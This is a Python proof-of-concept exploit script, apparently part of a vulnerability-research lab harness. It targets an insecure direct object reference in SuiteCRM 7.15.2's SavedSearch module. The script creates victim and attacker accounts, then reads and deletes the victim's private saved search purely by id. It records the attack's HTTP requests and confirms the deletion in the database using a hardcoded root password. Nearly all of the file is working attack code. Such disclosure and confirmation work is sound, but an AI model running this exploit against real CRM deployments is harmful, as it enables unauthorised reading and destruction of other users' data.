#!/usr/bin/env python3
"""
VULN-028 -- SavedSearch: read / delete any user's saved search by id (IDOR)

Target: SuiteCRM 7.15.2 (targets/SuiteCRM/)
Sinks:
  modules/SavedSearch/index.php:47-62   -- dispatches update/save/delete/read
      purely on $_REQUEST['saved_search_select'], no owner check.
  modules/SavedSearch/SavedSearch.php:493 (retrieveSavedSearch -> parent::retrieve)
  modules/SavedSearch/SavedSearch.php:336 (handleDelete -> mark_deleted($id))
  Owner scoping exists ONLY on the *listing* query
  (modules/SavedSearch/SavedSearch.php:~97-102, WHERE assigned_user_id=<current_user>)
  -- the by-id read/delete/update paths never check it.

What this script does
----------------------
1. Creates victim V and attacker A (fresh, unrelated low-priv users).
2. As V: saves a search on the Accounts module with a unique marker in a
   basic-search filter field ("name_basic") and a unique saved_search_name.
3. As A (id obtained purely by guessing/enumeration in a real attack; here
   we already know it because we just created it as the harness):
     a. READ  -- GET .../index.php?module=SavedSearch&action=index&saved_search_select=<id>
        and follow the redirect chain to the Accounts ListView -- assert
        V's marker and saved-search name show up in A's own list view,
        proving A received V's private search criteria + name.
     b. DELETE -- GET ...&saved_search_action=delete&saved_search_select=<id>
        -- verify via the db container that the row's `deleted` flag flips
        0 -> 1, even though `assigned_user_id` never equals A's id.

Environment variables:
    BASE_URL    (default http://localhost:33116)
    ADMIN_USER, ADMIN_PASS
    (DB verification shells out to `docker compose -p cvehunterlab_suitecrm
     exec -T db mysql ...`, matching claude_audit/SuiteCRM/exploits/TARGET_FACTS.md)
"""
import os
import re
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict,
                      admin_session, create_user, web_login)

VULN_ID = "VULN-028"
HERE = os.path.dirname(os.path.abspath(__file__))
COMPOSE_CWD = "/opt/cvehunter/targets/SuiteCRM"
COMPOSE_PROJECT = "cvehunterlab_suitecrm"


def db_query(sql):
    cmd = ["docker", "compose", "-p", COMPOSE_PROJECT, "exec", "-T", "db",
           "mysql", "-uroot", "-pSuiteRoot!2026x", "suitecrm", "-e", sql]
    res = subprocess.run(cmd, cwd=COMPOSE_CWD, capture_output=True, text=True, timeout=30)
    return res.stdout


def main():
    banner(VULN_ID, "SavedSearch: read/delete any user's saved search by id (IDOR)")

    log("SETUP", "admin web login; provisioning victim (V) and attacker (A)")
    admin = admin_session()
    victim = create_user(admin, "Victim@2026x!")
    attacker = create_user(admin, "Attacker@2026x!")
    log("INFO", f"victim   = {victim['user_name']} ({victim['id']})")
    log("INFO", f"attacker = {attacker['user_name']} ({attacker['id']})")

    vs = web_login(victim["user_name"], victim["password"])

    log("SETUP", "as V: save a private search on Accounts with a unique name + filter marker")
    ss_name = rand("V028SS")
    marker = rand("MARK028")
    save_req = {
        "module": "SavedSearch", "action": "index", "saved_search_action": "save",
        "search_module": "Accounts", "saved_search_name": ss_name,
        "query": "true", "searchFormTab": "basic_search", "name_basic": marker,
    }
    r = vs.post(f"{BASE_URL}/index.php", data=save_req,
                headers={"Referer": f"{BASE_URL}/index.php?module=Accounts&action=index"},
                allow_redirects=False, timeout=30)
    loc = r.headers.get("Location", "")
    m = re.search(r"saved_search_select=([0-9a-fA-F-]{36})", loc)
    if not m:
        verdict(VULN_ID, "FAILED", f"could not create victim SavedSearch (status={r.status_code}, loc={loc!r})")
        sys.exit(1)
    ss_id = m.group(1)
    log("OK", f"SavedSearch created by V: id={ss_id} name={ss_name} filter marker={marker}")

    # sanity: confirm it does NOT show up for A in a listing context is out of scope
    # (SavedSearch has no listing UI of its own beyond the per-module dropdown) --
    # the point of this finding is precisely that by-id ops skip the owner filter
    # that the dropdown *would* apply.

    as_ = web_login(attacker["user_name"], attacker["password"])

    # ---- READ ----
    log("STEP", "as A: request V's saved search purely by id (READ)")
    read_params = {"module": "SavedSearch", "action": "index",
                    "saved_search_select": ss_id, "search_module": "Accounts"}
    read_url = f"{BASE_URL}/index.php?" + "&".join(f"{k}={v}" for k, v in read_params.items())
    r2 = as_.get(f"{BASE_URL}/index.php", params=read_params, allow_redirects=True, timeout=30)

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(f"### 1) READ another user's saved search by id (attacker session)\n")
        f.write(f"GET {read_url.replace(BASE_URL, '')} HTTP/1.1\n")
        f.write(f"Host: localhost:33116\nCookie: PHPSESSID=<attacker-session>\n\n")
        f.write(f"### 2) DELETE another user's saved search by id (attacker session)\n")
        del_params = {"module": "SavedSearch", "action": "index", "saved_search_action": "delete",
                       "saved_search_select": ss_id, "search_module": "Accounts"}
        del_url = f"{BASE_URL}/index.php?" + "&".join(f"{k}={v}" for k, v in del_params.items())
        f.write(f"GET {del_url.replace(BASE_URL, '')} HTTP/1.1\n")
        f.write(f"Host: localhost:33116\nCookie: PHPSESSID=<attacker-session>\n")
        f.write(f"Referer: {BASE_URL}/index.php?module=Accounts&action=index\n")

    read_ok = (marker in r2.text) and (ss_name in r2.text)
    log("PROOF", f"final URL after redirects: {r2.url}")
    log("PROOF", f"V's filter marker {marker!r} reflected into A's own Accounts ListView: {marker in r2.text}")
    log("PROOF", f"V's saved_search_name {ss_name!r} reflected: {ss_name in r2.text}")

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write("### READ response (after following redirects) ###\n")
        f.write(f"final url: {r2.url}\nstatus: {r2.status_code}\n\n")
        idx = r2.text.find(ss_name) if ss_name in r2.text else 0
        f.write(r2.text[max(0, idx - 300):idx + 500])
        f.write("\n\n")

    # ---- DELETE ----
    log("STEP", "as A: delete V's saved search purely by id (DELETE)")
    del_params = {"module": "SavedSearch", "action": "index", "saved_search_action": "delete",
                  "saved_search_select": ss_id, "search_module": "Accounts"}
    r3 = as_.get(f"{BASE_URL}/index.php", params=del_params,
                 headers={"Referer": f"{BASE_URL}/index.php?module=Accounts&action=index"},
                 allow_redirects=False, timeout=30)
    log("INFO", f"delete request status={r3.status_code} loc={r3.headers.get('Location')}")

    log("STEP", "verify via db container: saved_search row before was deleted=0, now deleted=1")
    db_out = db_query(f"SELECT id,name,assigned_user_id,deleted FROM saved_search WHERE id='{ss_id}';")
    log("PROOF", f"db state after attacker delete:\n{db_out.strip()}")

    with open(os.path.join(HERE, "response.txt"), "a") as f:
        f.write("### DELETE response ###\n")
        f.write(f"status: {r3.status_code}\nLocation: {r3.headers.get('Location')}\n\n")
        f.write("### db container verification (docker compose exec db mysql) ###\n")
        f.write(f"SELECT id,name,assigned_user_id,deleted FROM saved_search WHERE id='{ss_id}';\n")
        f.write(db_out)

    deleted_ok = False
    for line in db_out.strip().splitlines()[1:]:
        cols = line.split("\t")
        if len(cols) >= 4 and cols[0] == ss_id and cols[3] == "1":
            deleted_ok = True

    with open(os.path.join(HERE, "evidence", "db_before_after.txt"), "w") as f:
        f.write(f"SavedSearch id: {ss_id}\nCreated by victim: {victim['id']} ({victim['user_name']})\n")
        f.write(f"Deleted by attacker: {attacker['id']} ({attacker['user_name']})\n\n")
        f.write("DB row after attacker's delete-by-id call:\n")
        f.write(db_out)

    if not read_ok:
        verdict(VULN_ID, "FAILED", "attacker did not receive victim's saved-search name/criteria")
        sys.exit(1)
    if not deleted_ok:
        verdict(VULN_ID, "FAILED", "victim's saved_search row was not marked deleted by attacker's call")
        sys.exit(1)

    log("OK", "both READ and DELETE cross-user operations succeeded")
    verdict(VULN_ID, "CONFIRMED",
            f"attacker read V's search name/criteria and mark_deleted() V's row (id={ss_id}) purely by id")
    sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:  # noqa: BLE001
        log("FAIL", f"unhandled exception: {exc!r}")
        verdict(VULN_ID, "FAILED", f"unhandled exception: {exc}")
        sys.exit(1)
